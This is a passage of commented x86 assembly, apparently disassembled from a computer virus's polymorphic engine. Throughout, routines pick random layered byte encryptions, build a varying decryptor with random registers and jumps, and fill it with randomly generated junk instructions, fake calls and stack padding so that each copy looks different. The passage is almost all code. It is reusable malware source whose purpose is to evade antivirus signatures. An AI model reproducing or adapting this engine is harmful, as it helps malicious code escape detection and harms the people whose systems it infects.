   jnb	loc_0_E4C

loc_0_E48:
   dec	al
   jmp	short loc_0_E4E
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_E4C:
   sub	al, 2

loc_0_E4E:
   cmp	al, 3
   jbe	loc_0_E7D
   cmp	cl, 0FFh
   jz	loc_0_E7D
   cmp	al, 5
   jnz	loc_0_E60
   cmp	ch, 0FFh
   jz	loc_0_E7D

loc_0_E60:
   and	al, 3
   jmp	short loc_0_E7D
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_E64:
   call	_getRND_in_DX
   mov	al, 0Ch		 ; AL=0C
   cmp	dh, 10h
   jb	loc_0_E7D
   cmp	cl, 0FFh
   jnz	loc_0_E7D
   inc	al		 ; AL=0D
   cmp	dh, 88h
   jb	loc_0_E7D
   inc	al		 ; AL=0E

loc_0_E7D:
   mov	DecryptType0[bx], al

loc_0_E81:
   or	bx, bx
   jz	loc_0_E97
   inc	si
   cmp	si, 10h		 ; used	to avoid endless loops
   jnb	loc_0_E97
   mov	al, DecryptType0[bx]
   cmp	al, (DecryptType0-5)[bx]
   jz	loc_0_D4F	 ; if same as before, select another one

loc_0_E97:
   add	bl, 5
   cmp	bl, 3Ch
   jnb	loc_0_EB1
   call	_getRND_in_DX
   mov	ax, bx
   imul	ax, 2CDh	 ; the greater BX, the less probability	to select another one
   neg	ax
   cmp	dx, ax
   jb	loc_0_D4A

loc_0_EB1:              
   mov	InitialDecryptState, ecx
   mov	DecryptTypeEnd,	bl ; specifies end of choosen decrypt algorithm
   call	_getRND_in_DX
   mov	ax, dx
   and	ax, 7FFh
   mov	dl, 9
   div	dl
   add	ah, 10h
   mov	byte_0_353, ah	 ; AH =	10..18
   cmp	byte_0_350, 1
   jnz	loc_0_ED8
   sub	ah, 8

loc_0_ED8:		 ; ah =	08..18
   mov	byte_0_352, ah
   call	_getRND_in_DX
   mov	al, 0		 ; AL =	00
   cmp	dh, 50h
   jb	loc_0_EF0
   mov	al, 5		 ; AL =	05
   cmp	dh, 0A0h
   jb	loc_0_EF0
   mov	al, 6		 ; AL =	06

loc_0_EF0:
   mov	DecryptOperation, al
   call	_getRND_in_DX
   cmp	dl, 10h
   jnb	loc_0_EFF
   add	dl, 10h

loc_0_EFF:		 ; dont	allow 0xFF
   cmp	dl, 0FFh
   jnz	loc_0_F07
   sub	dl, 2

loc_0_F07:		 ; DL =	10..FD
   mov	DecryptOffset, dl
   call	_getRND_in_DX
   shl	edx, 10h
   mov	dl, 1
   mov	StaticData_ACGCODES_Pointer_Increment, edx ; value 1, with random high word
   retn
Choose_Encryption endp

; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

Table_Code0:
   xor	al, cl
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

Table_Code1:
   xor	ah, cl
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

Table_Code2:
   xor	ax, cx
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

Table_Code3:
   xor	eax, ecx
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

Table_Code4:
   add	al, cl
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

Table_Code5:
   add	ah, cl
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

Table_Code6:
   add	ax, cx
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

Table_Code7:
   add	eax, ecx
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

Table_Code8:
   rol	al, cl
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

Table_Code9:
   rol	ah, cl
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

Table_CodeA:
   rol	ax, cl
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

Table_CodeB:
   rol	eax, cl
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

Table_CodeC:
   xor	eax, esi
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

Table_CodeD:
   add	eax, esi
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

Table_CodeE:
   sub	eax, esi
   retn

; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Encrypt_Byte proc near
   push	bx
   push	ecx
   push	dx
   push	esi
   movzx eax, al
   xor	bx, bx
   cmp	byte_0_350, 1
   jnz	loc_0_F6C
   xchg	ah, al

loc_0_F6C:
   mov	dl, DecryptType0[bx]
   mov	ecx, dword ptr (DecryptType0+1)[bx]
   mov	dh, 0
   shl	dx, 2		 ; DX =	DX * 4
   add	dx, offset Table_Code0
   call	dx
   add	bl, 5
   cmp	bl, DecryptTypeEnd
   jb	loc_0_F6C
   pop	esi
   pop	dx
   pop	ecx
   pop	bx
   retn
Encrypt_Byte endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


sub_0_F90 proc near
   pushad
   mov	cx, 702h

loc_0_F95:
   call	setRegFree
   dec	ch
   jns	loc_0_F95
   call	_Generate_4times_Garbage
   call	_Generate_4times_Garbage
   call	_Generate_4times_Garbage
   call	_Generate_4times_Garbage
   mov	eax, esi
   mov	ebp, 6
   cmp	edi, 1040000h
   jz	loc_0_FD3
   mov	ebp, 7
   cmp	edi, 1050000h
   jz	loc_0_FD3
   mov	ebp, 3

loc_0_FD3:
   mov	bh, 0FFh
   mov	bl, 2
   mov	cl, 4
   call	_Do_Instruction5
   mov	bh, 0
   mov	bl, DecryptTypeEnd
   sub	bl, 5

loc_0_FE6:
   call	_Generate_4times_Garbage
   call	_Generate_4times_Garbage
   call	_Generate_4times_Garbage
   push	esi
   push	edi
   mov	ch, DecryptType0[bx]
   cmp	ch, 8
   jnb	loc_0_1056
   and	ch, 3
   cmp	ch, 2
   jnb	loc_0_1019
   mov	edx, eax
   and	dl, 3
   shl	ch, 2
   or	dl, ch
   mov	edi, edx
   mov	cl, 1
   jmp	short loc_0_1025
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_1019:
   mov	edi, eax
   mov	cl, 2
   cmp	ch, 2
   jz	loc_0_1025
   mov	cl, 4

loc_0_1025:
   mov	esi, dword ptr (DecryptType0+1)[bx]
   mov	ch, DecryptType0[bx]
   push	bx
   mov	bl, 4
   mov	bh, 6
   cmp	ch, 4
   jb	loc_0_1045
   mov	bh, 5
   call	_getRND_in_DX
   jns	loc_0_1045
   mov	bh, 0
   neg	esi

loc_0_1045:
   mov	Dont_Extend_Immediate, 1
   call	_Do_Instruction5
   mov	Dont_Extend_Immediate, 0
   pop	bx
   jmp	short loc_0_10BC
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_1056:
   cmp	ch, 0Ch
   jnb	loc_0_108E
   sub	ch, 8
   cmp	ch, 2
   jnb	loc_0_1075
   mov	edx, eax
   and	dl, 3
   shl	ch, 2
   or	dl, ch
   mov	edi, edx
   mov	cl, 1
   jmp	short loc_0_1081
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_1075:
   mov	edi, eax
   mov	cl, 2
   cmp	ch, 2
   jz	loc_0_1081
   mov	cl, 4

loc_0_1081:
   push	bx
   mov	bl, (DecryptType0+1)[bx]
   mov	bh, 1
   call	Do_SHIFT2
   pop	bx
   jmp	short loc_0_10BC
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_108E:
   push	bx
   mov	edi, eax
   mov	esi, ebp
   mov	bl, 0
   call	_getRND_in_DX
   jns	loc_0_10A5
   mov	edi, ebp
   mov	esi, eax
   mov	bl, 2

loc_0_10A5:
   mov	bh, 6
   cmp	ch, 0Ch
   jz	loc_0_10B5
   mov	bh, 0
   cmp	ch, 0Eh
   jz	loc_0_10B5
   mov	bh, 5

loc_0_10B5:
   mov	cl, 4
   call	_Do_Instruction5
   pop	bx

loc_0_10BC:
   pop	edi
   pop	esi
   sub	bl, 5
   jnb	loc_0_FE6
   call	_Generate_4times_Garbage
   call	_Generate_4times_Garbage
   call	_Generate_4times_Garbage
   call	_Generate_4times_Garbage
   push	esi
   push	edi
   mov	edi, ebp
   mov	esi, StaticData_ACGCODES_Pointer_Increment
   mov	cl, 4
   mov	bl, 4
   mov	bh, 0
   call	_Do_Instruction5
   pop	edi
   pop	esi
   call	_Generate_4times_Garbage
   call	_Generate_4times_Garbage
   call	_Generate_4times_Garbage
   call	_Generate_4times_Garbage
   and	al, 3
   cmp	byte_0_350, 1
   jnz	loc_0_110C
   or	al, 4

loc_0_110C:
   push	esi
   push	edi
   mov	edi, eax
   mov	si, word ptr DecryptOffset
   mov	cl, 1		 ; 8 bits
   mov	bh, 7		 ; CMP
   mov	bl, 4		 ; imm
   call	_Do_Instruction2
   pop	edi
   pop	esi
   mov	SaveFlags, 1
   call	_Generate_4times_Garbage
   call	_Generate_4times_Garbage
   mov	SaveFlags, 0
   mov	SaveFlags, 1
   mov	bh, 5
   mov	dx, 0FF00h
   call	Create_Jump
   push	Instruction_Offset
   mov	SaveFlags, 0
   call	_Generate_4times_Garbage
   call	_Generate_4times_Garbage
   call	_Generate_4times_Garbage
   call	_Generate_4times_Garbage
   push	edi
   push	esi
   mov	edi, ebp
   mov	esi, 3
   mov	cl, 2
   mov	bl, 4
   mov	bh, 0
   mov	Dont_Extend_Immediate, 1
   call	_Do_Instruction5
   mov	Dont_Extend_Immediate, 0
   pop	esi
   pop	edi
   call	_Generate_4times_Garbage
   call	_Generate_4times_Garbage
   call	_Generate_4times_Garbage
   call	_Generate_4times_Garbage
   mov	cl, 4
   mov	bl, 2
   mov	bh, 0FFh
   call	_Do_Instruction5
   call	_Generate_4times_Garbage
   call	_Generate_4times_Garbage
   call	_Generate_4times_Garbage
   call	_Generate_4times_Garbage
   push	edi
   mov	edi, ebp
   mov	cl, 4
   mov	bl, 2
   mov	bh, DecryptOperation ; BH = 0 ,	5 , 6
   call	_Do_Instruction5
   call	_Generate_4times_Garbage
   call	_Generate_4times_Garbage
   call	_Generate_4times_Garbage
   call	_Generate_4times_Garbage
   mov	cl, 4
   mov	bl, 0
   mov	bh, 0FFh
   call	_Do_Instruction5
   call	_Generate_4times_Garbage
   call	_Generate_4times_Garbage
   call	_Generate_4times_Garbage
   call	_Generate_4times_Garbage
   mov	edi, esi
   mov	cl, 4
   mov	bh, 1
   mov	bl, byte_0_352
   call	Do_SHIFT3
   pop	edi
   pop	bx
   mov	dx, Instruction_Offset
   sub	dx, bx
   mov	es:[bx-2], dx
   popad
   nop
   call	_Generate_4times_Garbage
   call	_Generate_4times_Garbage
   call	_Generate_4times_Garbage
   call	_Generate_4times_Garbage
   retn
sub_0_F90 endp

; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
Reg8Tbl	db    0,   2,	4,   6,	  1,   3,   5,	 7

; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


getRegIndex proc near
   mov	bl, ch
   cmp	cl, 1
   jnz	not_reg8
   mov	bh, 0
   mov	bl, Reg8Tbl[bx]	 ; convert reg8	index into reg16 index
   jmp	short loc_0_122F
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

not_reg8:
   shl	bl, 1

loc_0_122F:
   mov	bh, 0
   retn
getRegIndex endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


RegIndex_to_CH proc near
   push	dx
   mov	dx, bx
   mov	ch, 0

loc_0_1237:
   call	_getRegIndex
   cmp	bx, dx
   jz	loc_0_1243
   inc	ch
   jmp	short loc_0_1237
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_1243:
   pop	dx
   retn
RegIndex_to_CH endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Touch_EDI proc near
   movzx edi, di
   cmp	di, 0FF00h
   jnb	loc_0_125B	 ; jump	if register
   or	edi, 1060000h
   add	di, D_CODEBASE
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_125B:
   and	edi, 7
   retn
Touch_EDI endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Touch_ESI proc near
   xchg	edi, esi
   call	Touch_EDI
   xchg	edi, esi
   retn
Touch_ESI endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


IsRegUsed proc near
   push	bx
   call	_getRegIndex
   mov	al, byte ptr Used_AX[bx]
   cmp	cl, 1
   jz	loc_0_127C
   or	al, byte ptr (Used_AX+1)[bx]

loc_0_127C:
   pop	bx
   retn
IsRegUsed endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


IsRegFree proc near
   push	bx
   call	_getRegIndex
   mov	al, byte ptr Free_AX[bx]
   cmp	cl, 1
   jz	loc_0_1290
   or	al, byte ptr (Free_AX+1)[bx]

loc_0_1290:
   pop	bx
   retn
IsRegFree endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


get_Register_Size proc near
   push	bx
   call	_getRegIndex
   mov	al, byte ptr Size_AX[bx]
   cmp	cl, 1
   jz	loc_0_12A4
   or	al, byte ptr (Size_AX+1)[bx]

loc_0_12A4:		 ; AL=1,2,3
   pop	bx
   retn
get_Register_Size endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


setRegUsed proc	near
   push	bx
   push	dx
   call	_getRegIndex
   mov	dl, cl
   cmp	al, 0
   jnz	loc_0_12B4
   mov	dl, 0

loc_0_12B4:
   mov	byte ptr Used_AX[bx], al
   mov	byte ptr Free_AX[bx], 1
   mov	byte ptr Size_AX[bx], dl ; size?
   cmp	cl, 1
   jz	loc_0_12D3
   mov	byte ptr (Used_AX+1)[bx], al
   mov	byte ptr (Free_AX+1)[bx], 1
   mov	byte ptr (Size_AX+1)[bx], dl

loc_0_12D3:
   pop	dx
   pop	bx
   retn
setRegUsed endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


setRegFree proc	near
   push	bx
   call	_getRegIndex
   mov	byte ptr Free_AX[bx], 1
   cmp	cl, 1
   jz	loc_0_12EA
   mov	byte ptr (Free_AX+1)[bx], 1

loc_0_12EA:
   pop	bx
   retn
setRegFree endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


sub_0_12EC proc	near
   push	bx
   xor	bx, bx

loc_0_12EF:
   cmp	byte ptr Used_AX[bx], 0
   jz	loc_0_12FB
   or	byte ptr Used_AX[bx], 1

loc_0_12FB:
   inc	bx
   cmp	bx, 10h
   jnz	loc_0_12EF
   pop	bx
   retn
sub_0_12EC endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Reset_Used_Regs	proc near
   push	bx
   xor	bx, bx

loc_0_1306:
   and	byte ptr Used_AX[bx], 2
   cmp	byte ptr Used_AX[bx], 0
   jnz	loc_0_1317
   mov	byte ptr Size_AX[bx], 0

loc_0_1317:
   inc	bx
   cmp	bx, 10h
   jnz	loc_0_1306
   pop	bx
   retn
Reset_Used_Regs	endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Add_Stack proc near
   pushad
   call	_Generate_4times_Garbage
   call	_getRND_in_DX
   cmp	dl, 20h
   jnb	loc_0_133F
   cmp	cl, 4
   jnz	loc_0_133F
   mov	cl, 2
   call	Add_Stack
   call	Add_Stack

loc_0_133B:
   popad
   nop
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_133F:
   cmp	dh, 40h
   jb	loc_0_1356
   call	_Choose_Register
   cmp	ch, 8
   jnb	loc_0_1356
   movzx edi, ch
   call	Do_POP		 ; POP reg
   jmp	short loc_0_133B
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_1356:
   cmp	dh, 20h
   jb	loc_0_139F

loc_0_135B:
   mov	ch, 0
   mov	al, 2		 ; choose SP
   test	dl, 7
   jnz	loc_0_1366
   mov	al, 4		 ; choose ESP

loc_0_1366:
   test	dh, 1
   jz	loc_0_1382

loc_0_136B:
   xchg	ax, cx
   call	_Add_Needed_Prefix_66
   xchg	ax, cx
   call	_Store_Instruction_Byte2
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   db 44h		 ; INC SP
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   call	_Copy_Instruction
   call	_Generate_4times_Garbage
   loop	loc_0_136B

loc_0_1380:
   jmp	short loc_0_133B
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_1382:
   xchg	ax, cx
   call	_Add_Needed_Prefix_66
   call	_Store_Instruction_Byte2
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   db 83h
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   call	_Store_Instruction_Byte2
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   db 0C4h
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   call	_Store_Instruction_Byte	; ADD SP,xx
   call	_Copy_Instruction
   call	_Generate_4times_Garbage
   jmp	short loc_0_1380
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_139F:
   cmp	Return_Offset, 0FFFFh
   jnz	loc_0_135B
   call	Do_CALL2	 ; CALL
   call	_Generate_4times_Garbage
   call	_Generate_4times_Garbage
   call	_Generate_4times_Garbage
   call	_Generate_4times_Garbage
   call	_Store_Instruction_Byte2
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   db 0C2h		 ; RET 00xx
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   xchg	ax, cx
   call	_Store_Instruction_Byte
   call	_Store_Instruction_Byte2
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   db 0
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   call	_Copy_Instruction
   call	Restore_Return_Offset
   jmp	short loc_0_1380
Add_Stack endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Do_CALL3 proc near
   push	dx
   push	ax
   call	_getRND_in_DX
   mov	ax, D_CS_I
   shr	ax, 4
   cmp	dx, ax
   pop	ax
   pop	dx
   jnb	locret_0_140F
Do_CALL3 endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Do_CALL2 proc near
   push	ax
   push	cx
   push	dx
   mov	cx, 4
   call	_Allocate_Code_Space ; select destination of CALL
   push	dx		 ; DX =	new offset of code to be generated (inside CALL)
   add	dx, D_CODEBASE
   call	Do_CALL
   mov	ax, Instruction_Offset
   mov	Return_Offset, ax ; save offset	where CALL is supposed to return
   pop	ax
   mov	Instruction_Offset, ax ; stablish new offset for generating code
   pop	dx
   pop	cx
   pop	ax
   call	_Generate_4times_Garbage
   call	_Generate_4times_Garbage
   call	_Generate_4times_Garbage

locret_0_140F:
   retn
Do_CALL2 endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Check_CALL proc	near
   cmp	Return_Offset, 0FFFFh
   jz	locret_0_140F
   call	_Generate_4times_Garbage
   call	_Generate_4times_Garbage
   call	_Generate_4times_Garbage
   cmp	SaveFlags, 0
   jnz	loc_0_1436
   push	dx
   call	_getRND_in_DX
   cmp	dh, 80h
   pop	dx
   jb	sub_0_1446	 ; do not return, and continue inside CALL

loc_0_1436:		 ; do a	RET
   call	Do_Procedure_Return
Check_CALL endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Restore_Return_Offset proc near
   push	ax
   mov	ax, 0FFFFh
   xchg	ax, Return_Offset
   mov	Instruction_Offset, ax ; continue generating code after	CALL
   pop	ax
   retn
Restore_Return_Offset endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


sub_0_1446 proc	near
   mov	Return_Offset, 0FFFFh
   push	cx
   mov	cl, 2
   call	Add_Stack	 ; clean stack (because	we dont	return from CALL)
   pop	cx
   retn
sub_0_1446 endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл

; OUTPUT:
;    CL	= OperandSize

getRND_OperandSize proc	near
   push	dx
   call	_getRND_in_DX
   mov	cl, 1		 ; OperandSize=1
   cmp	dl, 68h
   jb	loc_0_1469
   mov	cl, 2		 ; OperandSize=2
   cmp	dl, 0D0h
   jb	loc_0_1469
   mov	cl, 4		 ; OperandSize=4

loc_0_1469:
   pop	dx
   retn
getRND_OperandSize endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл

; INPUT:
;    CL	= 1 -->	use displacement with index
; 
; OUTPUT:
;    EDI = Target

getRND_Target proc near
   push	edx
   xor	edx, edx
   call	_getRND_in_DX
   and	dx, 0Fh		 ; EDX = 00..0F
   cmp	dx, 8
   jb	loc_0_14C8	 ; use a register as target
   cmp	cl, 1
   jz	loc_0_1498
   mov	edi, 1060000h	 ; displacement	without	index
   call	_getRND_in_DX
   cmp	dx, 0FFFDh
   jb	loc_0_1494	 ; make	sure offset = 0..FFFC
   sub	dl, 3

loc_0_1494:		 ; EDI = Target
   mov	di, dx
   jmp	short loc_0_14CB
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_1498:
   call	_getRND_in_DX
   and	dx, 7
   or	dh, 1
   shl	edx, 10h
   cmp	edx, 1060000h
   jz	loc_0_14C4	 ; use 16-bit displacement (without index)
   call	_getRND_in_DX
   cmp	dh, 0A0h
   ja	loc_0_14C4
   cmp	dh, 50h
   movsx dx, dl		 ; 8-bit signed	displacement
   ja	loc_0_14C8
   xor	dx, dx		 ; null	displacement
   jmp	short loc_0_14C8
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_14C4:		 ; 16-bit displacement
   call	_getRND_in_DX

loc_0_14C8:		 ; EDI = target
   mov	edi, edx

loc_0_14CB:
   pop	edx
   retn
getRND_Target endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Generate_4times_Garbage	proc near
   call	$+3
   call	$+3
Generate_4times_Garbage	endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Do_Garbage proc	near
   inc	Garbage_Level
   cmp	Garbage_Level, 4
   jnb	Garbage_Exit
   push	CSPREF
   mov	byte ptr CSPREF, 2 ; any prefix	segment	can be used for	garbage	instructions
   pushad
   xor	bp, bp		 ; used	to avoid endless loops
   call	_getRND_in_DX
   cmp	dx, D_CS_V
   jnb	Garbage_Exit2	 ; do not generate garbage
   cmp	SaveFlags, 0FFh
   jz	Garbage_Exit2	 ; jump	if segment prefix has already been stored
   mov	bh, 0FFh	 ; MOV
   cmp	SaveFlags, 0
   jnz	@@1
   call	_getRND_in_DX
   cmp	dx, RandomWORD1
   jb	loc_0_163E
   call	_getRND_in_DX
   cmp	dh, 60h
   jb	@@1
   mov	bh, dl
   and	bh, 7		 ; select random operation

@@1:
   call	_getRND_OperandSize
   mov	ch, dh
   and	ch, 7		 ; select random register
   cmp	dl, 4
   jb	@@7		 ; use memory as target
   cmp	bh, 7
   jz	@@2		 ; jump	if CMP
   call	_Choose_Register ; select an unused register
   cmp	ch, 8
   jnb	Garbage_Exit2

@@2:
   movzx edi, ch
   call	_getRND_in_DX
   cmp	dh, 0A0h
   jb	@@4
   cmp	bh, 0FFh
   jz	@@3
   cmp	dl, 20h
   jb	@@3
   mov	ch, 0
   call	_IsRegUsed
   cmp	al, 0
   jnz	@@3
   call	setRegFree
   mov	di, 0		 ; use AL/AX/EAX as target

@@3:
   mov	bl, 4
   call	_getRND_in_EDX
   mov	esi, edx	 ; ESI=source=immediate
   jmp	short @@6
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

@@4:
   mov	esi, edi
   mov	bl, 2		 ; direction of	operation (ESI as target)
   cmp	bh, 7
   jnz	@@5		 ; skip	if not CMP
   call	_getRND_in_DX
   and	dx, 2
   xor	bx, dx		 ; choose direction of operation

@@5:
   call	_getRND_Target

@@6:
   call	Do_Instruction

Garbage_Exit2:
   popad
   nop
   pop	CSPREF

Garbage_Exit:
   dec	Garbage_Level
   retn
